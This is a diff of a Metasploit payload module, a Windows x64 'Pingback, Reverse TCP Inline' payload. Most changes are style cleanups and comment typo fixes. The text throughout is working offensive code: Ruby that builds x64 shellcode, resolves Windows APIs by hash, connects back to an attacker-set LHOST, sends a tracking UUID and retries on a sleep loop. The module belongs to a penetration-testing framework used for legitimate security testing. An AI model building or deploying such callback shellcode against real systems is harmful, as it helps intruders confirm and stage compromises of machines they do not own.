@@ -4,8 +4,7 @@
 ##
 
 module MetasploitModule
-
-  CachedSize = 425
+  CachedSize = 422
 
   include Msf::Payload::Windows
   include Msf::Payload::Single
@@ -15,42 +14,45 @@ module MetasploitModule
   include Msf::Payload::Windows::Exitfunk_x64
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Windows x64 Pingback, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and report UUID (Windows x64)',
-      'Author'        => [ 'bwatters-r7' ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'win',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::Pingback
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Windows x64 Pingback, Reverse TCP Inline',
+        'Description' => 'Connect back to attacker and report UUID (Windows x64)',
+        'Author' => [ 'bwatters-r7' ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::Pingback
+      )
+    )
+  end
 
-    def required_space
-      # Start with our cached default generated size
-      space = cached_size
+  def required_space
+    # Start with our cached default generated size
+    space = cached_size
 
-      # EXITFUNK 'seh' is the worst case, that adds 15 bytes
-      space += 15
+    # EXITFUNK 'seh' is the worst case, that adds 15 bytes
+    space += 15
 
-      space
-    end
+    space
+  end
 
-    def generate
-      # 22 -> "0x00,0x16"
-      # 4444 -> "0x11,0x5c"
-      encoded_port = [datastore['LPORT'].to_i, 2].pack("vn").unpack("N").first
-      encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || "127.127.127.127").unpack("V").first
-      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
-      retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
-      pingback_count = datastore['PingbackRetries']
-      pingback_sleep = datastore['PingbackSleep']
-      self.pingback_uuid ||= self.generate_pingback_uuid
-      uuid_as_db = "0x" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")
-      conf = { exitfunk: datastore['EXITFUNC'] }
+  def generate(_opts = {})
+    # 22 -> "0x00,0x16"
+    # 4444 -> "0x11,0x5c"
+    encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack('N').first
+    encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack('V').first
+    encoded_host_port = format('0x%<encoded_host>.8x%<encoded_port>.8x', { encoded_host: encoded_host, encoded_port: encoded_port })
+    retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
+    pingback_count = datastore['PingbackRetries']
+    pingback_sleep = datastore['PingbackSleep']
+    self.pingback_uuid ||= generate_pingback_uuid
+    uuid_as_db = '0x' + self.pingback_uuid.chars.each_slice(2).map(&:join).join(',0x')
+    conf = { exitfunk: datastore['EXITFUNC'] }
 
-
-      asm = %Q^
+    asm = %^
         cld                     ; Clear the direction flag.
         and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
         call start              ; Call start, this pushes the address of 'api_call' onto the stack.
@@ -78,17 +80,17 @@ module MetasploitModule
         not_lowercase:             ;
           ror r9d, 13              ; Rotate right our hash value
           add r9d, eax             ; Add the next byte of the name
-          loop loop_modname        ; Loop untill we have read enough
+          loop loop_modname        ; Loop until we have read enough
           ; We now have the module hash computed
           push rdx                 ; Save the current position in the module list for later
           push r9                  ; Save the current module hash for later
-          ; Proceed to itterate the export address table,
+          ; Proceed to iterate the export address table,
           mov rdx, [rdx+32]        ; Get this modules base address
           mov eax, dword [rdx+60]  ; Get PE header
           add rax, rdx             ; Add the modules base address
           cmp word [rax+24], 0x020B ; is this module actually a PE64 executable?
           ; this test case covers when running on wow64 but in a native x64 context via nativex64.asm and
-          ; their may be a PE32 module present in the PEB's module list, (typicaly the main module).
+          ; their may be a PE32 module present in the PEB's module list, (typically the main module).
           ; as we are using the win64 PEB ([gs:96]) we wont see the wow64 modules present in the win32 PEB ([fs:48])
           jne get_next_mod1         ; if not, proceed to the next module
           mov eax, dword [rax+136] ; Get export tables RVA
@@ -166,14 +168,14 @@ module MetasploitModule
 
         ; perform the call to LoadLibraryA...
           mov rcx, r14            ; set the param for the library to load
-          mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+          mov r10d, #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
           call rbp                ; LoadLibraryA( "ws2_32" )
 
         ; perform the call to WSAStartup...
-          mov rdx, r13            ; second param is a pointer to this stuct
+          mov rdx, r13            ; second param is a pointer to this struct
           push 0x0101             ;
           pop rcx                 ; set the param for the version requested
-          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'WSAStartup')}
           call rbp                ; WSAStartup( 0x0101, &WSAData );
 
         ; stick the retry count on the stack and store it
@@ -184,7 +186,7 @@ module MetasploitModule
 
         create_socket:
         ; perform the call to WSASocketA...
-          push rax                ; if we succeed, rax wil be zero, push zero for the flags param.
+          push rax                ; if we succeed, rax will be zero, push zero for the flags param.
           push rax                ; push null for reserved parameter
           xor r9, r9              ; we do not specify a WSAPROTOCOL_INFO structure
           xor r8, r8              ; we do not specify a protocol
@@ -192,7 +194,7 @@ module MetasploitModule
           mov rdx, rax            ; push SOCK_STREAM
           inc rax                 ;
           mov rcx, rax            ; push AF_INET
-          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'WSASocketA')}
           call rbp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
           mov rdi, rax            ; save the socket for later
 
@@ -202,7 +204,7 @@ module MetasploitModule
           pop r8                  ; pop off the third param
           mov rdx, r12            ; set second param to pointer to sockaddr struct
           mov rcx, rdi            ; the socket
-          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'connect')}
           call rbp                ; connect( s, &sockaddr, 16 );
 
           test eax, eax           ; non-zero means failure
@@ -217,13 +219,13 @@ module MetasploitModule
         failure:
           call exitfunk
 
-        ; this  lable is required so that reconnect attempts include
+        ; this label is required so that reconnect attempts include
         ; the UUID stuff if required.
         connected:
 
         send_pingback:
           xor r9, r9              ; flags
-          push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
+          push #{uuid_as_db.split(',').length} ; length of the PINGBACK UUID
           pop r8
           call get_pingback_address  ; put uuid buffer on the stack
           db #{uuid_as_db}  ; PINGBACK_UUID
@@ -231,31 +233,30 @@ module MetasploitModule
         get_pingback_address:
           pop rdx                ; PINGBACK UUID address
           mov rcx, rdi           ; Socket handle
-          mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'send')}
           call rbp               ; call send
 
         close_socket:
           mov rcx, rdi           ; Socket handle
-          mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'closesocket')}
           call rbp               ; call closesocket
         ^
-      if pingback_count > 0
-        asm << %Q^
+    if pingback_count > 0
+      asm << %^
           sleep:
             test r15, r15         ; check pingback retry counter
             jz exitfunk           ; bail if we are at 0
             dec r15               ;decrement the pingback retry counter
-            push #{(pingback_sleep * 1000)}            ; 10 seconds
+            push #{pingback_sleep * 1000}            ; 10 seconds
             pop rcx               ; set the sleep function parameter
-            mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+            mov r10d, #{block_api_hash('kernel32.dll', 'Sleep')}
             call rbp              ; Sleep()
             jmp create_socket     ; repeat callback
         ^
-      end
-      if conf[:exitfunk]
-        asm << asm_exitfunk(conf)
-      end
-      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
     end
+    if conf[:exitfunk]
+      asm << asm_exitfunk(conf)
+    end
+    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
   end
 end
